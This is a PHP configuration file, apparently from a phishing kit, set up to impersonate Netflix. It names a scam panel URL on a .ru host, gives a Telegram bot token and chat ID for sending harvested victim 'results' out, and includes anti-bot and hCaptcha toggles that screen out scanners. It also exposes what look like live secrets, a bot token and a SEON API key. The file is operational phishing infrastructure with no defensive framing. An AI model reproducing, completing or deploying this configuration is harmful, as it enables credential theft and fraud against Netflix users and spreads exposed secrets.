<?php
/*
██████╗ ██╗      █████╗  ██████╗██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██║     ███████║██║     █████╔╝ █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝   
Coded By Root_Dr
DM:@Root_Dr
*/
session_start();
error_reporting(0);

// Hcaptcha https://www.hcaptcha.com/
define("HCAPTCHA", false); // true or false
define("SECRETKEY", ''); // secretkey hcaptcha
define("SITEKEY", ''); // site key hcaptcha

define("TESTMODE", false); // true or false
define("ANTIBOTPW_API", ''); // ANTIBOT.PW API
define("SEON_API_KEY", '5e5d208b-596e-4b4f-9960-a4a7d118ed12'); // From PANKI project

define("FLAG", '🎞️');
define("SCAM_NAME", 'NETFLIX');
define("WEBSITE", 'https://netflix.com/');

// SCAM LINK
define("PANEL", 'http://srv243293.hoster-test.ru/ne/');
// TELEGRAM BOT REZ CONFIG
define("TOKEN", '8487334853:AAGPvUrYI4QWYNe1NpuxTCucFfrF3CM21UI');
define("CHATID", '-5020792802');

define("NOTIF", true); // true or false
define("NOTIF_CHATID", '-');

// MAIL REZ CONFIG
define("BULLET", '');

define("PHONE", false); // true or false
define("CONTROLLER", true); // true or false
